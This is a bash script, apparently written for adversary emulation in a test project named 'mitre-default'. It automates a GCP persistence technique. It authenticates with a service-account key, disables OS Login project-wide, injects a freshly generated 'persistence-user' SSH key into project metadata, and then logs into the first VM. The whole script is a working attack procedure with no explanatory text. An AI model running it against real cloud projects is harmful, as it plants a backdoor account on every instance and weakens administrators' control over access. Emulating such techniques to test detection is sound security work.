#!/usr/bin/env bash

PROJECT_ID="mitre-default"
PROJECT_NUMBER=$(gcloud projects describe ${PROJECT_ID} --format="get(projectNumber)")
gcloud config set project $PROJECT_ID

# authenticate
gcloud auth activate-service-account --key-file key.json

# do ssh keys
ssh-keygen -t rsa -f ~/.ssh/persistence -C persistence-user -q -N ""
chmod 400 ~/.ssh/persistence
SSH_PUB_KEY=$(cat ~/.ssh/persistence.pub)

cat > persistence-ssh-metadata-config << EOF
persistence-user:$SSH_PUB_KEY
EOF

gcloud compute project-info add-metadata \
    --metadata="enable-oslogin=FALSE"

gcloud compute project-info add-metadata \
    --metadata-from-file ssh-keys=persistence-ssh-metadata-config

FIRST_IP=$(gcloud compute instances list \
    --format="value(networkInterfaces[0].accessConfigs[0].natIP)" | head -1)

VM_NAME=$(gcloud compute instances list \
    --format="value(name)" | head -1)

gcloud compute ssh persistence-user@${VM_NAME} \
    --zone us-central1-a -- -vvvv

ssh -vvvv -i ~/.ssh/persistence -l persistence-user ${FIRST_IP}